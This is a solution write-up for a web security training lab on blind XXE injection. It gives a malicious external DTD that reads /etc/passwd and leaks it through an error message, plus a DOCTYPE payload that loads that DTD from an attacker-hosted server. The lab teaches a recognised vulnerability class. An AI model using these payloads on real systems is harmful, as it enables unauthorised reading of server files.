# Lab 6: Exploiting blind XXE to retrieve data via error messages
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

## Solution
> Manual Exploitation
1. Click "Go to exploit server" and save the following malicious DTD file on your server:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
When imported, this page will read the contents of `/etc/passwd` into the `file` entity, and then try to use that entity in a file path.
2. Click "View exploit" and take a note of the URL for your malicious DTD.
3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
4. Insert the following external entity definition in between the XML declaration and the stockCheck element:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
You should see an error message containing the contents of the `/etc/passwd` file.

> Automating the process
- [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/XXE%20Injection/lab-06/lab-06-script.py)

## Video Solution
- [Sommer's Video](https://youtu.be/4JFu1JM_VYU)
- [Seven Seas Security's Video](https://youtu.be/nyXjJ915keM)
